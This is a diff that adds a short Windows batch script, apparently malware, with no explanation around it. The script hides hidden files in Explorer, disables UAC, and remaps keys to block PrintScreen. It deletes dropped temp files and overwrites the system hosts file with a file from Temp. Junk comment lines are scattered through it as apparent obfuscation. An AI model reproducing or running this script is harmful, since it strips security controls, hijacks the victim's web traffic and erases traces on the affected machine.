@@ -1,0 +1,9 @@
+Reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /V Hidden /T REG_DWORD /D 0 /F
+::ulzdd5akj312epmjhxwhz2edpcrxeigu6q5xpvkbkhwo¬A@
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 000000000000000003000000000037e00000540000000000 /f
+erase "C:\DOCUME~1\STATIO~2.RIM\LOCALS~1\Temp\wpbt0.dll"
+::ulzdd5akj312epmjhxwhz2edpcrxeigu6q5xpvkbkhwo¬A@
+erase /Q "C:\DOCUME~1\STATIO~2.RIM\LOCALS~1\Temp\lshml.vbs"
+chcp 1251
+copy "C:\DOCUME~1\STATIO~2.RIM\LOCALS~1\Temp\p83j9" "C:\WINDOWS\system32\drivers\etc\hîsts" /Y
